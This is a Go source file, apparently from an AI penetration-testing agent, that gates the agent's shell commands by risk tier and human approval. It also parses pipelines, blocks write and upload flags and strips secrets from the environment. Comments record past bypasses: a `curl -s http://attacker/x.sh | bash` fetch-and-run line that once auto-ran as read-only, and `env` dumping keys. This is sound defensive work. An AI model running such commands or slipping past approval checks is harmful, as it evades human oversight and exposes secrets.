// Package tools 命令/文件执行器：风险分级、并发限流、超时与熔断、工作区路径约束。
// 设计对应流程图护栏：工具白名单由「审批矩阵 + 全量留证」承担——智能体可调用任意工具，
// 但每条命令先分级（L0 自动 / L1、L2 人工批准 / FORBIDDEN 拒绝），执行全程留证。
package tools

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// 风险等级（审批矩阵的操作等级维度）。
const (
	L0ReadOnly = "L0"        // 只读侦察：自动执行
	L1Write    = "L1"        // 写操作/扫描载荷：需人工批准
	L2High     = "L2"        // 利用/横向/提权类高危：必须人工批准
	Forbidden  = "FORBIDDEN" // 破坏性/拒绝服务类：默认禁止
)

type Executor struct {
	workspace    string // 项目工作区根目录
	timeout      time.Duration
	asyncTimeout time.Duration // v3.2.0：run_async 默认超时（独立于同步命令，默认 1h）
	maxOut       int
	forbidden    []*regexp.Regexp
	highRisk     []*regexp.Regexp
	medRisk      []*regexp.Regexp
	readOnly     []*regexp.Regexp // 保留：正则形式（兼容展示），L0 判定实际走 readOnlyPfx 锚定
	readOnlyPfx  []string         // v3.2.0：L0 白名单小写前缀（段首词锚定语义）
	sensitive    []*regexp.Regexp // v3.2.0：敏感面特征（L0 命中即降级 L1）

	concurrency int // v3.4.0：每项目并发命令上限（原硬编码 4，接 config engine.max_concurrent_exec）

	mu       sync.Mutex
	semas    map[string]chan struct{} // projectID -> 并发闸
	runnings map[string]*exec.Cmd     // projectID -> 正在运行的进程（最后一条，用于熔断）
	extraEnv map[string]string        // 空间测绘等 Key 注入命令环境（服务端保存，不进前端）

	hardCap      time.Duration                   // v2.6：同步命令硬上限（默认 30min，防长命令阻塞流水线）
	asyncHardCap time.Duration                   // v2.6：后台任务硬上限（默认 2h）
	idleTimeout  time.Duration                   // v4.6 K7：同步命令空闲护栏（连续无输出即终止，0=禁用；默认 120s）
	asyncMu      sync.Mutex                      // v2.6：后台任务注册表锁
	asyncJobs    map[string]map[string]*AsyncJob // v2.6：projectID -> jobID -> job

	sessMu   sync.Mutex                          // v3.3.0：持久交互会话注册表锁
	sessions map[string]map[string]*ShellSession // v3.3.0：projectID -> sessionID -> session
}

// SetExtraEnv 更新注入命令的环境变量（Web 设置保存后调用）。
func (e *Executor) SetExtraEnv(kv map[string]string) {
	e.mu.Lock()
	e.extraEnv = kv
	e.mu.Unlock()
}

// ExtraEnvNames 返回已注入的测绘 Key 变量名列表（不返回值；供上下文包告知智能体可用能力）。
func (e *Executor) ExtraEnvNames() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]string, 0, len(e.extraEnv))
	for k := range e.extraEnv {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func (e *Executor) extraEnvSlice() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]string, 0, len(e.extraEnv))
	for k, v := range e.extraEnv {
		out = append(out, k+"="+v)
	}
	return out
}

func NewExecutor(workspace string, timeoutSec, maxOut int, guard struct {
	Forbidden, HighRisk, MedRisk, ReadOnly, Sensitive []string
}) (*Executor, error) {
	if err := os.MkdirAll(workspace, 0o750); err != nil {
		return nil, err
	}
	e := &Executor{
		workspace:    workspace,
		timeout:      time.Duration(timeoutSec) * time.Second,
		asyncTimeout: time.Hour,
		idleTimeout:  120 * time.Second, // v4.6 K7 默认；SetIdleTimeout 可覆盖（cfg command_idle_timeout_sec）
		concurrency:  4,
		maxOut:       maxOut,
		semas:        map[string]chan struct{}{},
		runnings:     map[string]*exec.Cmd{},
		hardCap:      30 * time.Minute,
		asyncHardCap: 2 * time.Hour,
		asyncJobs:    map[string]map[string]*AsyncJob{},
		sessions:     map[string]map[string]*ShellSession{},
	}
	compile := func(pats []string) []*regexp.Regexp {
		var out []*regexp.Regexp
		for _, p := range pats {
			if re, err := regexp.Compile(`(?i)` + p); err == nil {
				out = append(out, re)
			}
		}
		return out
	}
	e.forbidden = compile(guard.Forbidden)
	e.highRisk = compile(guard.HighRisk)
	e.medRisk = compile(guard.MedRisk)
	e.readOnly = compile(guard.ReadOnly)
	for _, p := range guard.ReadOnly {
		e.readOnlyPfx = append(e.readOnlyPfx, strings.ToLower(p))
	}
	e.sensitive = compile(guard.Sensitive)
	return e, nil
}

// SetConcurrency 设置每项目并发命令上限（≤0 保持默认 4）。v3.4.0 接线 max_concurrent_exec（原死配置）。
func (e *Executor) SetConcurrency(n int) {
	if n > 0 {
		e.concurrency = n
	}
}

// SetCaps 设置同步命令硬上限、后台任务硬上限与后台默认超时（秒；≤0 保持默认）。启动时由 main 按 config 注入。
func (e *Executor) SetCaps(hardCapSec, asyncHardCapSec, asyncDefaultSec int) {
	if hardCapSec > 0 {
		e.hardCap = time.Duration(hardCapSec) * time.Second
	}
	if asyncHardCapSec > 0 {
		e.asyncHardCap = time.Duration(asyncHardCapSec) * time.Second
	}
	if asyncDefaultSec > 0 {
		e.asyncTimeout = time.Duration(asyncDefaultSec) * time.Second
	}
}

// SetIdleTimeout v4.6 K7：同步命令空闲护栏秒数（<=0 禁用）。启动时由 main 按 config 注入。
func (e *Executor) SetIdleTimeout(sec int) {
	if sec > 0 {
		e.idleTimeout = time.Duration(sec) * time.Second
	} else {
		e.idleTimeout = 0
	}
}

// ClassifyRisk 对命令做风险分级：FORBIDDEN > L2 > L1 >（敏感面降级）> L0。
// v3.2.0 安全加固：L0 判定从「全命令子串匹配」改为「段首词锚定 + 危险元字符否决」——
// 修复实测可绕过：`curl -s http://attacker/x.sh | bash` 因包含 "curl -s" 曾被判 L0
// 自动执行（管道右段完全不受白名单约束）；现要求管道/顺序操作符的每一段都锚定命中
// 白名单前缀，且全命令禁止命令替换、反引号与重定向写。
func (e *Executor) ClassifyRisk(command string) string {
	for _, re := range e.forbidden {
		if re.MatchString(command) {
			return Forbidden
		}
	}
	for _, re := range e.highRisk {
		if re.MatchString(command) {
			return L2High
		}
	}
	for _, re := range e.medRisk {
		if re.MatchString(command) {
			return L1Write
		}
	}
	if e.readOnlySafe(command) {
		for _, re := range e.sensitive {
			if re.MatchString(command) {
				return L1Write // 敏感面（引擎密钥/凭据路径/进程环境）从只读降级为写操作，走审批留痕
			}
		}
		return L0ReadOnly
	}
	return L1Write // 未知命令按写操作处理；v5.2.0 起默认审批策略 manual——未知命令必然人工审批
}

// readOnlySafe v3.3.0 L0 只读安全判定（v3.2.0 段首词锚定 + 危险元字符否决的引号感知升级）。
// 规则：
//  1. 全命令否决：反引号、$() 命令替换（双引号内同样执行，故不区分引号状态）、<() 进程替换、换行；
//  2. 重定向否决：仅未加引号的 <、> 视为重定向（引号内的 '>' 是字面量，bash 语义）；
//     豁免无副作用的丢弃类（2>&1、>/dev/null、2>/dev/null、&>/dev/null）；
//  3. 分段锚定：引号感知切段（| ; & 与 && || 仅在引号外是操作符——URL "…&b=2" 不再被误切），
//     每段 trim 后必须以白名单前缀开头（词边界，避免 "id" 命中 "identify"）；
//  4. 段内写盘/上传/状态变更参数否决（curl -d/-F/-X POST/--upload/--config、find -exec、tee 绝对路径等）；
//     输出落盘类参数（curl -o / nmap -oA / sort -o / tee）仅拒绝绝对路径与逃逸路径——
//     相对路径落点即项目工作区（沙箱内），不再误伤 `-o poc.py` 类日常动作（v3.3.0 manual 摩擦回补）。
func (e *Executor) readOnlySafe(command string) bool {
	s := strings.TrimSpace(command)
	if s == "" {
		return false
	}
	if strings.ContainsAny(s, "`\n") || strings.Contains(s, "$(") || strings.Contains(s, "<(") {
		return false
	}
	// 豁免无副作用的输出丢弃/标准流合并（丢弃目标恒为 /dev/null 与流复制，不涉及用户路径）
	for _, noise := range []string{"2>&1", "2>/dev/null", ">&2", ">/dev/null", "&>/dev/null"} {
		s = strings.ReplaceAll(s, noise, " ")
	}
	segs, unquotedRedirect := splitShellSegments(s)
	if unquotedRedirect {
		return false
	}
	for _, seg := range segs {
		if seg == "" {
			continue
		}
		if !e.readOnlyPrefixMatch(seg) || writeishSegment(seg) {
			return false
		}
	}
	return true
}

// splitShellSegments 引号感知切段：返回（段列表, 是否存在未加引号的重定向元字符）。
// 单引号内一切字面；双引号内 > < | ; & 均为字面量（$() 与反引号例外，已在调用方整体否决）。
// ReadOnlySafe v5.4.3 导出只读判定：治理门"状态变更合取"规则豁免用——只读命令在语义上
// 不可能造成状态变更，不应因关键词文本巧合被连坐拦截。
func (e *Executor) ReadOnlySafe(command string) bool { return e.readOnlySafe(command) }

func splitShellSegments(s string) (segs []string, unquotedRedirect bool) {
	var cur strings.Builder
	inSingle, inDouble := false, false
	flush := func() { segs = append(segs, strings.TrimSpace(cur.String())); cur.Reset() }
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '\\' && i+1 < len(s): // 转义对保留原样（被转义的分隔符不再是操作符）
			cur.WriteByte(c)
			cur.WriteByte(s[i+1])
			i++
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			cur.WriteByte(c)
		case c == '"' && !inSingle:
			inDouble = !inDouble
			cur.WriteByte(c)
		case !inSingle && !inDouble && (c == '|' || c == ';' || c == '&'):
			flush()
		case !inSingle && !inDouble && (c == '<' || c == '>'):
			unquotedRedirect = true
			flush()
		default:
			cur.WriteByte(c)
		}
	}
	flush()
	return
}

// readOnlyPrefixMatch 段必须以白名单条目开头（小写前缀 + 词边界锚定）。
func (e *Executor) readOnlyPrefixMatch(seg string) bool {
	low := strings.ToLower(seg)
	for _, p := range e.readOnlyPfx {
		if !strings.HasPrefix(low, p) {
			continue
		}
		rest := low[len(p):]
		if rest == "" {
			return true
		}
		// 词边界仅在条目末字符是词字符（字母/数字）时生效：
		// "id" 不命中 "identify"；而 "ls "/"cat/" 类以空格或符号结尾的条目后接任意参数均放行
		if isWordByte(p[len(p)-1]) && isWordByte(rest[0]) {
			continue
		}
		return true
	}
	return false
}

func isWordByte(b byte) bool {
	// 不含 '-'："ps -aux" 类「裸词+旗标」可命中裸词条目；连字词误放面可忽略（无对应危险二进制）
	return b == '_' || (b >= '0' && b <= '9') || (b >= 'a' && b <= 'z')
}

// writeishSegment 只读白名单内的已知「写盘/上传/状态变更」参数否决（按段检查）。
// 输出落盘类（-o/--output/-oA/tee 目标）交给 outputPathAbsolute：相对路径（落点=项目工作区）放行，
// 绝对路径/$ 展开/.. 逃逸拒绝——日常 `-o poc.py`、`nmap -oA scan` 不再误伤。
func writeishSegment(seg string) bool {
	low := strings.ToLower(seg)
	switch firstWord(low) {
	case "curl", "httpx":
		for _, re := range curlWriteish {
			if re.MatchString(low) {
				return true
			}
		}
	case "nmap":
		for _, re := range nmapWriteish {
			if re.MatchString(low) {
				return true
			}
		}
	case "find":
		for _, re := range findWriteish {
			if re.MatchString(low) {
				return true
			}
		}
	case "sort":
		for _, re := range sortWriteish {
			if re.MatchString(low) {
				return true
			}
		}
	}
	return outputPathAbsolute(low)
}

// outputPathAbsolute 检查段内输出落盘参数（-o/-oX/--output/tee 目标）是否写到工作区之外。
// 判据：以 / 开头的绝对路径、含 '$'（展开后不可控）、以 '..' 开头或含 '/../' 的逃逸路径。
// "-"（stdout）、/dev/* 与空参数视为无害。
func outputPathAbsolute(seg string) bool {
	for _, re := range outputTargetPatterns {
		for _, m := range re.FindAllStringSubmatch(seg, -1) {
			if argIsOutsideWorkspace(m[1]) {
				return true
			}
		}
	}
	// tee 的所有非旗标参数都是写目标（tee -a f1 f2）
	if i := strings.Index(seg, "tee "); i >= 0 {
		for _, f := range strings.Fields(seg[i+4:]) {
			if strings.HasPrefix(f, "-") {
				continue
			}
			if argIsOutsideWorkspace(f) {
				return true
			}
		}
	}
	return false
}

func argIsOutsideWorkspace(raw string) bool {
	p := strings.Trim(raw, `"'`)
	if p == "" || p == "-" || p == "/dev/null" || p == "/dev/stdout" || p == "/dev/stderr" {
		return false
	}
	if strings.Contains(p, "$") || strings.HasPrefix(p, "/") ||
		strings.HasPrefix(p, "..") || strings.Contains(p, "/../") {
		return true
	}
	return false
}

func firstWord(s string) string {
	if i := strings.IndexByte(s, ' '); i > 0 {
		return s[:i]
	}
	return s
}

// outputTargetPatterns 输出落盘目标提取（短旗标簇感知：-sO/-oX 粘连同样命中）。
var outputTargetPatterns = compilePatterns(
	`(?:^|\s)-[a-z]{0,4}o[a-z]*\s+([^\s]+)`, // curl -o f、nmap -oA base、sort -o f、-sO 粘连
	`--output[=\s]+([^\s]+)`,
)

// curlWriteish curl/httpx 的上传/POST/状态变更类参数（输出落盘走 outputPathAbsolute，不在此列）。
var curlWriteish = compilePatterns(
	`(^|\s)-[a-z]{0,4}d(\s|=|$)`, // -d/--data POST 体（-sd 粘连）
	`--data`, `--json`,
	`--form`, `--upload`, // -F/-T/--upload-file（-F 小写化后与 fail 旗标 -f 不可分，接受漏检）
	`(^|\s)-[a-z]{0,4}t(\s|$)`,                       // -T telnet/上传
	`(^|\s)-[a-z]{0,4}x\s*(post|put|delete|patch)\b`, // -X POST/PUT/DELETE/PATCH 状态变更
	`--config`, // -K 注入配置文件
)

var nmapWriteish = compilePatterns() // v3.3.0：-oA 系改走 outputPathAbsolute（相对路径放行）

var findWriteish = compilePatterns(
	`(^|\s)-exec(dir)?\b`, `(^|\s)-ok(dir)?\b`, // 任意命令执行
	`(^|\s)-delete\b`, `(^|\s)-fprint`, // 删除/写文件
)

var sortWriteish = compilePatterns() // v3.3.0：sort -o 改走 outputPathAbsolute

func compilePatterns(pats ...string) []*regexp.Regexp {
	var out []*regexp.Regexp
	for _, p := range pats {
		if re, err := regexp.Compile(p); err == nil {
			out = append(out, re)
		}
	}
	return out
}

// Result 命令执行结果（v3.4.0：Stderr 独立捕获，不再与 stdout 混流）。
type Result struct {
	Stdout   string
	Stderr   string
	ExitCode int
}

// Run 在项目工作区执行命令：并发限流、超时、输出截断。
func (e *Executor) Run(ctx context.Context, projectID, command string, timeoutSec int) (*Result, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil, fmt.Errorf("命令为空")
	}
	if timeoutSec <= 0 {
		timeoutSec = int(e.timeout.Seconds())
	}
	// v2.6：同步命令硬上限——无论请求多大超时，同步命令最长 hardCap（默认 30 分钟），
	// 防止长扫描同步阻塞整个执行循环（实测一条全词表枚举阻塞流水线 2 小时）；长任务应走 run_async。
	if e.hardCap > 0 && time.Duration(timeoutSec)*time.Second > e.hardCap {
		timeoutSec = int(e.hardCap.Seconds())
	}
	// 并发闸
	e.mu.Lock()
	sem, ok := e.semas[projectID]
	if !ok {
		sem = make(chan struct{}, e.concurrency)
		e.semas[projectID] = sem
	}
	e.mu.Unlock()
	select {
	case sem <- struct{}{}:
		defer func() { <-sem }()
	case <-ctx.Done():
		return nil, ctx.Err()
	}

	cctx, cancel := context.WithTimeout(ctx, time.Duration(timeoutSec)*time.Second)
	defer cancel()
	cmd := exec.CommandContext(cctx, "bash", "-lc", command)
	cmd.Dir = e.workspaceDir(projectID)
	// v3.7.6 同步命令进程组加固（实测卡死：searchsploit -u 内部拉起 apt 网络挂死 1.5h——
	// 超时只杀直接子进程时，继承 stdout 管道的孙进程让 cmd.Wait() 永不返回，整条执行循环卡死）：
	// ① Setpgid 独立进程组；② ctx 到期时 Cancel 杀整组（孙进程一并终止）；
	// ③ WaitDelay=10s 强制 Wait 返回（即使仍有逃逸进程握住管道）。
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// v5.9.1 race 修复：Cancel 闭包此前直接读 cmd.Process——该字段由 os/exec Cmd.Start()
	// 在 Run() 主 goroutine 中写入，与空闲看门狗 goroutine 并发读构成 data race
	//（TestV46IdleTimeout race detector 实证）。改为 atomic 容器：Start 后主 goroutine
	// 填充 pid，看门狗/Cancel 只读原子值。
	var runPid atomic.Int64
	killRunGroup := func() {
		if pid := runPid.Load(); pid > 0 {
			_ = syscall.Kill(-int(pid), syscall.SIGKILL)
		}
	}
	cmd.Cancel = func() error {
		killRunGroup()
		return nil
	}
	cmd.WaitDelay = 10 * time.Second
	// v2.5.1 目标主机流量直连保证（引擎级，不再依赖提示词纪律）；v3.2.0 升级为环境变量白名单：
	// 子进程只继承安全键（PATH/HOME/TERM 等），LLM_API_KEY / ADMIN_PASSWORD / AUTH_TOKEN /
	// 密钥类变量不再泄漏给任意工具命令（实测 `env` 此前为 L0 自动执行可直接倒出全部密钥）。
	// 测绘 Key 经 extraEnv 显式注入（功能保留）；TOOL_PROXY 保留（v3.4.2 回归修复）供智能体显式引用。
	cmd.Env = append(append(sanitizeEnv(os.Environ()), "JIUTOUNIAO=1", "LANG=C.UTF-8"), e.extraEnvSlice()...)

	e.mu.Lock()
	e.runnings[projectID] = cmd
	e.mu.Unlock()
	defer func() {
		e.mu.Lock()
		delete(e.runnings, projectID)
		e.mu.Unlock()
	}()

	// v3.4.0 stderr 分离（原 CombinedOutput 把两者混流、Result.Stderr 恒为死字段）：
	// 错误/进度流单独可判，工具回执据此做错误自愈建议；证据链展示合并视图。
	var outBuf, errBuf bytes.Buffer
	// v4.6 K7 空闲护栏：活动时间戳随每次输出刷新，看门狗连续无输出 idleTimeout 即终止进程组。
	// 实证：某历史任务 searchsploit 更新网络挂死 300s 超时改 91 分钟空转——超时护栏只封上限，
	// 不封"慢烧"；空闲护栏封"静默慢烧"。长静默任务应走 run_async（后台任务不启用空闲护栏）。
	var lastActivity int64 = time.Now().UnixNano()
	var idleFired atomic.Bool // v5.9.1 race 修复：看门狗 goroutine 写 / 主 goroutine 读，改原子
	if e.idleTimeout > 0 {
		last := &lastActivity
		fired := &idleFired
		outTee := &activityWriter{buf: &outBuf, last: last}
		errTee := &activityWriter{buf: &errBuf, last: last}
		cmd.Stdout, cmd.Stderr = outTee, errTee
		stopWatch := make(chan struct{})
		defer close(stopWatch)
		go func() {
			tick := time.NewTicker(2 * time.Second)
			defer tick.Stop()
			for {
				select {
				case <-stopWatch:
					return
				case <-tick.C:
					if time.Since(time.Unix(0, atomic.LoadInt64(last))) > e.idleTimeout {
						killRunGroup() // 杀整组（与 ctx 超时同路径；v5.9.1 直连原子 pid，不经 cmd.Cancel）
						fired.Store(true)
						return
					}
				}
			}
		}()
	} else {
		cmd.Stdout, cmd.Stderr = &outBuf, &errBuf
	}
	// v5.9.1 race 修复：拆分 Start/Wait——Start 后主 goroutine 填充 runPid（atomic），
	// 看门狗 killRunGroup 只读原子值，与 Start 的写入不再并发。
	if err := cmd.Start(); err != nil {
		return &Result{}, err
	}
	runPid.Store(int64(cmd.Process.Pid))
	runErr := cmd.Wait()
	out := outBuf.Bytes()
	res := &Result{Stdout: truncate(string(out), e.maxOut), Stderr: truncate(errBuf.String(), min(e.maxOut, 8192))}
	err := runErr
	if idleFired.Load() {
		return res, fmt.Errorf("命令空闲超时（连续 %s 无输出，进程组已终止）——长静默任务请改用 run_async 后台执行", e.idleTimeout)
	}
	if ctx.Err() != nil {
		return res, ctx.Err() // 熔断/项目取消
	}
	if cctx.Err() == context.DeadlineExceeded {
		return res, fmt.Errorf("命令超时（%ds）", timeoutSec)
	}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			res.ExitCode = ee.ExitCode()
		} else {
			return res, err
		}
	}
	return res, nil
}

// ---------- v2.6 后台任务（run_async/poll_async 引擎保证） ----------

// AsyncJob 后台任务：进程组执行 + 日志落 .async/ + 超时/熔断整组终止。
type AsyncJob struct {
	ID        string
	Command   string
	LogPath   string // 相对项目工作区路径
	StartedAt time.Time
	Timeout   time.Duration

	cmd      *exec.Cmd
	doneCh   chan struct{} // 关闭后 stateFin/exitFin 可无锁读
	stateFin string        // finished/killed
	exitFin  int

	// v6.0.1 P4（fix-plan 20261122）：日志实时可观测——实证 s2-passive.sh 运行 20+ 分钟
	// 日志 0 字节（管道 tail 缓冲），工作台无法区分「在跑没输出」与「日志损坏」，
	// 进程被杀时输出全丢。原子计数 + 最后输出时间戳，经 sidecar/poll_async 暴露。
	logBytes int64 // 原子：已写入日志的字节数
	lastOut  int64 // 原子：最后一次输出的 UnixNano（0=尚无输出）
}

// countingWriter v6.0.1 P4：透传写文件并维护实时字节数/最后输出时间戳（原子读）。
// 日志文件始终是权威产物——计数器故障只影响观测，不影响落盘完整性。
type countingWriter struct {
	f     *os.File
	bytes *int64
	last  *int64
}

func (w *countingWriter) Write(p []byte) (int, error) {
	n, err := w.f.Write(p)
	if n > 0 {
		atomic.AddInt64(w.bytes, int64(n))
		atomic.StoreInt64(w.last, time.Now().UnixNano())
	}
	return n, err
}

// activityWriter v4.6 K7：输出计数器——每次写入刷新活动时间戳（原子读），供空闲看门狗判定。
type activityWriter struct {
	buf  *bytes.Buffer
	last *int64
}

func (w *activityWriter) Write(p []byte) (int, error) {
	if len(p) > 0 {
		atomic.StoreInt64(w.last, time.Now().UnixNano())
	}
	return w.buf.Write(p)
}

// StartAsync 后台执行命令：立即返回 job，不阻塞执行循环；输出落 .async/job-<id>.log。
func (e *Executor) StartAsync(projectID, command string, timeoutSec int) (*AsyncJob, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil, fmt.Errorf("命令为空")
	}
	if timeoutSec <= 0 {
		// v3.2.0 修复：曾回退到同步 command_timeout_sec（默认 300s），后台深扫 5 分钟即被杀，
		// 与工具文档「默认 3600」相悖；现取独立后台默认超时（async_timeout_sec，默认 1h）。
		timeoutSec = int(e.asyncTimeout.Seconds())
	}
	if e.asyncHardCap > 0 && time.Duration(timeoutSec)*time.Second > e.asyncHardCap {
		timeoutSec = int(e.asyncHardCap.Seconds())
	}
	dir := e.workspaceDir(projectID)
	logDir := filepath.Join(dir, ".async")
	if err := os.MkdirAll(logDir, 0o750); err != nil {
		return nil, err
	}
	id, err := newJobID()
	if err != nil {
		return nil, err
	}
	lf, err := os.OpenFile(filepath.Join(logDir, "job-"+id+".log"), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o640)
	if err != nil {
		return nil, err
	}
	job := &AsyncJob{
		ID: id, Command: truncate(command, 500),
		LogPath:   filepath.Join(".async", "job-"+id+".log"),
		StartedAt: time.Now(), Timeout: time.Duration(timeoutSec) * time.Second,
		cmd:    exec.Command("bash", "-lc", command),
		doneCh: make(chan struct{}),
	}
	job.cmd.Dir = dir
	// 与 Run 一致：v3.2.0 环境变量白名单（密钥不泄漏给后台任务），TOOL_PROXY 由命令显式引用
	job.cmd.Env = append(append(sanitizeEnv(os.Environ()), "JIUTOUNIAO=1", "LANG=C.UTF-8"), e.extraEnvSlice()...)
	job.cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // 进程组：超时/熔断整组终止，不留孤儿继续打目标
	job.cmd.WaitDelay = 10 * time.Second                      // v3.7.6：逃逸孙进程握管道时强制 Wait 返回
	// v6.0.1 P4：stdout/stderr 经计数 writer 透传（实时字节数/最后输出时间供 poll_async 与 sidecar）
	job.cmd.Stdout = &countingWriter{f: lf, bytes: &job.logBytes, last: &job.lastOut}
	job.cmd.Stderr = &countingWriter{f: lf, bytes: &job.logBytes, last: &job.lastOut}
	if err := job.cmd.Start(); err != nil {
		lf.Close()
		return nil, err
	}
	e.asyncMu.Lock()
	if e.asyncJobs[projectID] == nil {
		e.asyncJobs[projectID] = map[string]*AsyncJob{}
	}
	e.asyncJobs[projectID][id] = job
	e.asyncMu.Unlock()
	e.writeJobSidecar(projectID, job) // v3.4.0 落盘元数据：引擎重启后 poll_async 仍可答复
	go func() {
		defer lf.Close()
		timer := time.NewTimer(job.Timeout)
		defer timer.Stop()
		fin := make(chan struct{})
		go func() { _ = job.cmd.Wait(); close(fin) }()
		select {
		case <-fin:
			job.stateFin = "finished"
		case <-timer.C:
			killGroup(job.cmd.Process.Pid)
			<-fin
			job.stateFin = "killed"
		}
		if job.cmd.ProcessState != nil {
			job.exitFin = job.cmd.ProcessState.ExitCode()
		}
		// v4.6 E2 终态标记：日志尾部强制写入机器可判定的完成标记（实测 nuclei 部分扫描被
		// 预算收口截杀后，0 字节 findings 在交付层被洗白成"6445 模板 0 命中干净"——
		// 无标记的日志与被杀的日志在 S7/S8 无法区分）。同步刷新 sidecar 终态。
		_, _ = fmt.Fprintf(lf, "\n[JT-JOB-END] state=%s exit=%d ended_at=%s\n",
			job.stateFin, job.exitFin, time.Now().Format(time.RFC3339))
		e.finalizeJobSidecar(projectID, job)
		close(job.doneCh)
	}()
	return job, nil
}

// asyncSidecar 后台任务落盘元数据（v3.4.0）：任务表纯内存曾致引擎重启后 poll_async
// 全部「未知 job id」、断点续跑失去后台任务支撑；现写 sidecar JSON，重启后按 pid 存活判态恢复。
type asyncSidecar struct {
	ID        string `json:"id"`
	Command   string `json:"command"`
	Log       string `json:"log"`
	StartedAt string `json:"started_at"`
	Timeout   int    `json:"timeout_sec"`
	PID       int    `json:"pid"`
	// v4.6 E2 终态字段：任务结束后刷新（poll_async/质量门据此判定完成而非猜活）
	State    string `json:"state,omitempty"`
	ExitCode int    `json:"exit_code,omitempty"`
	EndedAt  string `json:"ended_at,omitempty"`
	// v6.0.1 P4 日志可观测：实时字节数 + 最后输出时间（旧 sidecar 无此字段→poll 时 stat 日志文件兜底）
	LogBytes     int64  `json:"log_bytes,omitempty"`
	LastOutputAt string `json:"last_output_at,omitempty"`
}

// jobObs v6.0.1 P4：从原子计数器取观测值（内存 job 路径）。
func jobObs(job *AsyncJob) (int64, string) {
	b := atomic.LoadInt64(&job.logBytes)
	ls := atomic.LoadInt64(&job.lastOut)
	ts := ""
	if ls > 0 {
		ts = time.Unix(0, ls).Format(time.RFC3339)
	}
	return b, ts
}

// finalizeJobSidecar v4.6 E2：任务终态回写 sidecar（state/exit/ended_at）。
func (e *Executor) finalizeJobSidecar(projectID string, job *AsyncJob) {
	lb, lo := jobObs(job)
	sc := asyncSidecar{ID: job.ID, Command: job.Command, Log: job.LogPath,
		StartedAt: job.StartedAt.Format(time.RFC3339),
		Timeout:   int(job.Timeout.Seconds()),
		State:     job.stateFin, ExitCode: job.exitFin,
		EndedAt: time.Now().Format(time.RFC3339),
		LogBytes: lb, LastOutputAt: lo}
	if sc.LastOutputAt == "" {
		sc.LastOutputAt = sc.EndedAt // 全程零输出：以终态时间兜底（区分「跑完零输出」与「时间戳丢失」）
	}
	if job.cmd.Process != nil {
		sc.PID = job.cmd.Process.Pid
	}
	b, _ := json.Marshal(sc)
	dir := e.workspaceDir(projectID)
	if os.MkdirAll(filepath.Join(dir, ".async"), 0o750) == nil {
		_ = os.WriteFile(filepath.Join(dir, ".async", "job-"+job.ID+".json"), b, 0o640)
	}
}

func (e *Executor) writeJobSidecar(projectID string, job *AsyncJob) {
	lb, lo := jobObs(job)
	sc := asyncSidecar{ID: job.ID, Command: job.Command, Log: job.LogPath,
		StartedAt: job.StartedAt.Format(time.RFC3339),
		Timeout:   int(job.Timeout.Seconds()),
		LogBytes:  lb, LastOutputAt: lo}
	if job.cmd.Process != nil {
		sc.PID = job.cmd.Process.Pid
	}
	b, _ := json.Marshal(sc)
	dir := e.workspaceDir(projectID)
	if os.MkdirAll(filepath.Join(dir, ".async"), 0o750) == nil {
		_ = os.WriteFile(filepath.Join(dir, ".async", "job-"+job.ID+".json"), b, 0o640)
	}
}

// recoverAsync 注册表 miss 时从 sidecar 恢复任务状态（引擎重启场景）。
// pid 已死（容器重启必然如此）→ finished；日志文件在 → 返回尾部；退出码不可考 → -1。
func (e *Executor) recoverAsync(projectID, jobID string) (state, output string, exitCode int, elapsed time.Duration, ok bool) {
	raw, err := os.ReadFile(filepath.Join(e.workspaceDir(projectID), ".async", "job-"+jobID+".json"))
	if err != nil {
		return "", "", -1, 0, false
	}
	var sc asyncSidecar
	if json.Unmarshal(raw, &sc) != nil {
		return "", "", -1, 0, false
	}
	state = "finished" // 引擎重启意味着旧进程组已被终止
	if sc.PID > 0 && syscall.Kill(sc.PID, 0) == nil {
		state = "running" // 同一容器内表丢失（理论场景）：进程仍活
	}
	started, _ := time.Parse(time.RFC3339, sc.StartedAt)
	output = tailFile(filepath.Join(e.workspaceDir(projectID), sc.Log), 6000)
	if output == "(暂无输出)" && state == "finished" {
		output = "(日志文件不存在，任务可能未产生输出)"
	}
	elapsed = time.Since(started).Truncate(time.Second)
	return state, output, -1, elapsed, true
}

// PollAsync 返回后台任务状态与输出尾部；ok=false 表示 job id 不存在（含 sidecar 恢复路径）。
func (e *Executor) PollAsync(projectID, jobID string) (state, output string, exitCode int, elapsed time.Duration, ok bool) {
	e.asyncMu.Lock()
	job := e.asyncJobs[projectID][jobID]
	e.asyncMu.Unlock()
	if job == nil {
		return e.recoverAsync(projectID, jobID) // v3.4.0：重启后从落盘元数据恢复
	}
	state, exitCode = "running", -1
	select {
	case <-job.doneCh:
		state, exitCode = job.stateFin, job.exitFin
	default:
	}
	output = tailFile(filepath.Join(e.workspaceDir(projectID), job.LogPath), 6000)
	return state, output, exitCode, time.Since(job.StartedAt).Truncate(time.Second), true
}

// KillAllAsync 终止项目全部运行中的后台任务（进程组级），返回终止数；记录保留供事后 poll。
func (e *Executor) KillAllAsync(projectID string) int {
	e.asyncMu.Lock()
	jobs := e.asyncJobs[projectID]
	e.asyncMu.Unlock()
	n := 0
	for _, job := range jobs {
		select {
		case <-job.doneCh:
			continue
		default:
		}
		if job.cmd.Process != nil {
			killGroup(job.cmd.Process.Pid)
			n++
		}
	}
	return n
}

func killGroup(pid int) {
	if pid <= 0 {
		return
	}
	_ = syscall.Kill(-pid, syscall.SIGKILL)
}

func newJobID() (string, error) {
	b := make([]byte, 5)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// ---------- v3.3.0 持久交互会话（shell_open/shell_write/shell_read/shell_close） ----------

// ShellSession 持久交互会话：stdin 管道注入 + 输出累积（增量读）。
